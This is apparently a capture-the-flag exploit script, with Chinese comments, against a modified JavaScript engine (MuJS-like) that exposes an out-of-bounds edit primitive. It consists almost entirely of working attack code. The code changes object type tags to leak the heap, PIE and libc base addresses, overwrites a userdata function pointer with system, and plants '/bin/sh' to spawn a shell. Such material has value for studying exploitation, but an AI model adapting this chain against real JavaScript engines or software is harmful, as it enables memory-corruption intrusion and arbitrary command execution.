// cp exp.js /tmp ; cd ../../ ; make clean ; make ; cd build/release ; cp /tmp/exp.js .

str1 = new String("fuck1")
str2 = new String("fuck2")

JRS = function(){                                                               // 這個不要宣告在前面, 否則會讓 heap 的順序亂掉
    function numberToBinString(number, binStringLength) {
        var A = [], T = null; // number>=0
        while (binStringLength--) {
            T = number % 2;
            A[binStringLength] = T;
            number -= T;
            number /= 2;
        }
        return A.join("");
    }

    function HexFn(fourBitsBinString) {
        return parseInt(fourBitsBinString, 2).toString(16);
    }

    function binStringToHexString(binString) {
        return binString.replace(/(\d{4})/g, HexFn );
    }

    function hexStringToBinString(hexString) {
        var binString = "";

        for(var i=0; i< hexString.length-1; i+=2) {
            binString += numberToBinString(parseInt(hexString.substr(i, 2), 16), 8);
        }

        return binString;    
    }

    function SngFwd(Sg, Ex, Mt) {
        var B = {};
        Mt = Math.pow(2, 23) * Mt + 0.5; // round
        B.a = 0xFF & Mt;
        B.b = 0xFF & (Mt >> 8);
        B.c = 0x7F & (Mt >> 16) | (Ex & 1) << 7;
        B.d = Sg << 7 | (Ex >> 1);
        return B;
    }

    function DblFwd(Sg, Ex, Mt) {
        var B = {};
        Mt = Math.pow(2, 52) * Mt;
        B.a = 0xFFFF & Mt;
        B.b = 0xFFFF & (Mt >> 16);
        Mt /= Math.pow(2, 32); // Integers are only 32-bit
        B.c = 0xFFFF & Mt;
        B.d = Sg << 15 | Ex << 4 | 0x000F & (Mt >> 16);
        return B;
    }

    function CVTFWD(NumW, Qty) { // Function now without side-effects
        var Sign = null, Expo = null, Mant = null, Bin = null, nb01 = ""; // , OutW = NumW/4
        var Inf = {
            32 : {d: 0x7F, c: 0x80, b: 0, a : 0},
            64 : {d: 0x7FF0, c: 0, b: 0, a : 0}
        };
        var ExW = {32: 8, 64: 11}[NumW], MtW = NumW - ExW - 1;

        if (isNaN(Qty)) {
            Bin = Inf[NumW];
            Bin.a = 1;
            Sign = false;
            Expo = Math.pow(2, ExW) - 1;
            Mant = Math.pow(2, -MtW);
        }

        if (!Bin) {
            Sign = Qty < 0 || 1 / Qty < 0; // OK for +-0
            if (!isFinite(Qty)) {
                Bin = Inf[NumW];
                if (Sign)
                    Bin.d += 1 << (NumW / 4 - 1);
                Expo = Math.pow(2, ExW) - 1;
                Mant = 0;
            }
        }

        if (!Bin) {
            Expo = {32: 127, 64: 1023}[NumW];
            Mant = Math.abs(Qty);
            while (Mant >= 2) {
                Expo++;
                Mant /= 2;
            }
            while (Mant < 1 && Expo > 0) {
                Expo--;
                Mant *= 2;
            }
            if (Expo <= 0) {
                Mant /= 2;
                nb01 = "Zero or Denormal";
            }
            if (NumW == 32 && Expo > 254) {
                nb01 = "Too big for Single";
                Bin = {
                    d : Sign ? 0xFF : 0x7F,
                    c : 0x80,
                    b : 0,
                    a : 0
                };
                Expo = Math.pow(2, ExW) - 1;
                Mant = 0;
            }
        }

        if (!Bin)
            Bin = {32: SngFwd, 64: DblFwd}[NumW](Sign, Expo, Mant);

        Bin.sgn = +Sign;
        Bin.exp = numberToBinString(Expo, ExW);
        Mant = (Mant % 1) * Math.pow(2, MtW);
        if (NumW == 32)
            Mant = Math.floor(Mant + 0.5);
        Bin.mnt = numberToBinString(Mant, MtW);
        Bin.nb01 = nb01;
        return Bin;
    }

    function CVTREV(BinStr) {
        var ExW = {32: 8,64: 11}[BinStr.length];
        var M = BinStr.match(new RegExp("^(.)(.{" + ExW + "})(.*)$"));
        // M1 sign, M2 exponent, M3 mantissa

        var Sign = M[1] == "1" ? -1 : +1;

        if (!/0/.test(M[2])) { // NaN or Inf
            var X = /1/.test(M[3]) ? NaN : Sign / 0;
            throw new Error("Max Coded " + M[3] + " " + X.toString());
        }

        var Denorm = +M[2] == 0;
        if (Denorm) {
            console.log("Zero or Denormal");
        }

        var Expo = parseInt(M[2], 2) - Math.pow(2, ExW - 1) + 1;
        var Mant = parseInt(M[3], 2) / Math.pow(2, M[3].length) + !Denorm;
        return Sign * Mant * Math.pow(2, Expo + Denorm);
    }

    this.doubleToHexString = function( /* double */d, /* int */size) {
        var NumW = size;
        var Qty = d;
        with (CVTFWD(NumW, Qty)) {
            return binStringToHexString(sgn + exp + mnt);
        }
    };

    this.hexStringToDouble = function (/*String*/hexString, /*int*/size) {
        var NumW = size ;
        var binString = hexStringToBinString(hexString) ;
        var X = new RegExp("^[01]{" + NumW + "}$");
        if (!X.test(binString)) {
            alert(NumW + " bits 0/1 needed");
            return;
        }
        return CVTREV(binString);
    };
};

jrs = new JRS()                            // 這個先寫, 再用 gdb 查位址

// leak heap (在 js_Object 中, number 和 string 的位址重疊, 所以改成 number class 並用 valueOf 印出 number )
// change str2->type to JS_CNUMBER (0x7)
str1.edit(0x29dc, 0x7)
str2.valueOf = Number.prototype.valueOf
heap_base = parseInt(jrs.doubleToHexString(str2.valueOf(), 64), 16) - 0x22204
print("heap_base @ 0x" + heap_base.toString(16))
print("str2 @ 0x"+(heap_base + 0x24b20).toString(16))


// leak pie (js_Object->properties 最後一個元素會指到 sentinel (保存在 bss 段), 由於 str1 沒有 property, 因此 str1->properties == sentinel (str2 有 valueOf)
// 先將 str2 改成 JS_CSTRING (0x8), 再修改 string 指到 sentinel, 然後用 charAt 印出來
str1.edit(0x29dc, 0x8)
sentinel = heap_base + 0x24a68
print("sentinel @ ", sentinel.toString(16))

// 運算後會以 32 bits 形式呈現, 因此要分開算 ( sentinel >> 1 => 32 bites)
lo = sentinel%0x100000000
hi = parseInt(sentinel/0x100000000)
for (i = 0; i < 4; i++)
    str1.edit(0x29fc+i, lo>>(8*i))
for (i = 0; i < 4; i++)
    str1.edit(0x29fc+4+i, hi>>(8*i))


// 由於 javascript 不能印 non-printable , 因此要先 encode, 此時 \xab 會變 %AB, 佔 3 個字元, 因此印 24 組
pie_base = ""
encode = encodeURI(str2)
for (i = 0, j = 0; i < encode.length; j++) {
    val = encode.charCodeAt(j)
    if (val == 0x25) {
        pie_base = encode.charAt(++j)+encode.charAt(++j) + pie_base
        i += 3
    }
    else {
        pie_base = encode.charCodeAt(j).toString(16) + pie_base
        i += 1;
    }
}
pie_base = parseInt(pie_base, 16) - 0x450a0
print("pie_base @ 0x" + pie_base.toString(16))



// leak libc_base (讓 string 指到 got)
exit_got = pie_base + 0x44f90
lo = exit_got%0x100000000
hi = parseInt(exit_got/0x100000000)
for (i = 0; i < 4; i++)
    str1.edit(0x29fc+i, lo>>(8*i))
for (i = 0; i < 4; i++)
    str1.edit(0x29fc+4+i, hi>>(8*i))

libc_base = ""
encode = encodeURI(str2)
for (i = 0, j = 0; i < encode.length; j++) {
    val = encode.charCodeAt(j)
    if (val == 0x25) {
        libc_base = encode.charAt(++j)+encode.charAt(++j) + libc_base
        i += 3
    }
    else {
        libc_base = encode.charCodeAt(j).toString(16) + libc_base
        i += 1;
    }
}
libc_base = parseInt(libc_base, 16) - 0x49bc0
print("libc_base @ 0x" + libc_base.toString(16))
system = libc_base + 0x55410



// 控 rip, 在 JS_CUSERDATA (0xf) 有 has put delete finailize 等 fptr 可以修改, 但 rdi 指向 J, 因此, 要嘛修改 *J = /bin/sh, 要嘛找 one_gadget
// change str2->type to JS_CUSERDATA (0xf)
str1.edit(0x29dc, 0xf)

lo = system%0x100000000
hi = parseInt(system/0x100000000)
for (i = 0; i < 4; i++)
    str1.edit(0x2a14+i, lo>>(8*i))
for (i = 0; i < 4; i++)
    str1.edit(0x2a14+4+i, hi>>(8*i))

// overwrite *J = /bin/sh
J = heap_base + 0x2a0
binsh = 0x68732f6e69622f
lo = (binsh%0x100000000) - 1     // overflow
hi = parseInt(binsh/0x100000000)
for (i = 0; i < 4; i++)
    str1.edit(-0x21ea4+i, lo>>(8*i))
for (i = 0; i < 4; i++)
    str1.edit(-0x21ea4+4+i, hi>>(8*i))



// trigger put
str2["5408"] = 9588
